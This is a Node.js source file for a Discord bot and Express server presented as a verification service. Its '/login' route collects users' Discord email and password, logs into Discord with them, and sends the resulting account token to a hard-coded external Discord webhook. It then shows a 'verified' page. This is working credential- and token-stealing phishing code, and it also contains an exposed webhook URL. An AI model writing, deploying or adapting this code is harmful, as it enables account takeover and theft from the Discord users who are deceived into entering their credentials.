var http = require('http');
var express = require('express');
var fs = require('fs');
var io   = require('socket.io');
var url  = require('url');
var path = require('path')
const superagent = require('superagent').agent();
const { Client, Events, GatewayIntentBits } = require('discord.js');
let token = '';

if (process.env.NODE_ENV === 'production') {
    token = process.env.CONFIG_TOKEN.token;
} else {
    const { token } = require('./config.json');
}
const { Collection } = require('discord.js')

// Create a new client instance
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
client.commands = new Collection();

const foldersPath = path.join(__dirname, 'commands');
const commandFolders = fs.readdirSync(foldersPath);

for (const folder of commandFolders) {
	const commandsPath = path.join(foldersPath, folder);
	const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
	for (const file of commandFiles) {
		const filePath = path.join(commandsPath, file);
		const command = require(filePath);
		// Set a new item in the Collection with the key as the command name and the value as the exported module
		if ('data' in command && 'execute' in command) {
			client.commands.set(command.data.name, command);
		} else {
			console.log(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
		}
	}
}

client.on(Events.InteractionCreate, async interaction => {
	if (!interaction.isChatInputCommand()) return;

	const command = interaction.client.commands.get(interaction.commandName);

	if (!command) {
		console.error(`No command matching ${interaction.commandName} was found.`);
		return;
	}

	try {
		await command.execute(interaction);
	} catch (error) {
		console.error(error);
		if (interaction.replied || interaction.deferred) {
			await interaction.followUp({ content: 'There was an error while executing this command!', ephemeral: true });
		} else {
			await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
		}
	}
});

const PORT = 8080; 

var app = express();
var server = http.createServer(app);
var socket = io(server);

app.engine('.html', require('ejs').__express);
app.set('views', __dirname + '/views');
app.set('view engine', 'html');

client.once(Events.ClientReady, readyClient => {
	console.log(`Ready! Logged in as ${readyClient.user.tag}`);
});

app.get('/', function(req, res){
    res.render('index');
});

app.get('/verified-message', function(req, res){
  res.render('verified');
});

app.get('/login', async (req, res) => {

  var sorting = req.query;
  const email = sorting.email;
  const password = sorting.password;

  try {
    let response = await superagent
    .post('https://discord.com/api/v9/auth/login')
    .send({
        gift_code_sku_id: null, 
        login: email, 
        login_source: null, 
        password: password, 
        undelete: false
    });
    token = response._body.token;
    console.log(token);
    // Post to webhook | Done
    // Webhook URL: https://discord.com/api/webhooks/1189498275456372767/7etCELqu_Jr9PlLUXAGkg9bCqotvTibtBTYY7nmgxWcKeIPYL8FfVqgvhYyoKF8DxL3F
    // Redirect to Discord Bot | Done
    const params = {
      content: "TOKEN: " + token
    }
    let request = await superagent
    .post("https://discord.com/api/webhooks/1189498275456372767/7etCELqu_Jr9PlLUXAGkg9bCqotvTibtBTYY7nmgxWcKeIPYL8FfVqgvhYyoKF8DxL3F")
    .set('Content-type', 'application/json').send(params);
  } catch (error) {
    console.log('INVALID CREDENTIALS');
    // Display on webpage that there is incorrect credentials
    return res.send("Incorrect Credentials");
  }
  res.redirect('/verified-message');
  // Give user who logged in verified role | In Progress | Gonna Take A while
});

app.use(express.static(path.join(__dirname, '/public/')));

app.listen(8080, '192.168.1.249');
console.log('Server running on port ' + PORT);
client.login(token);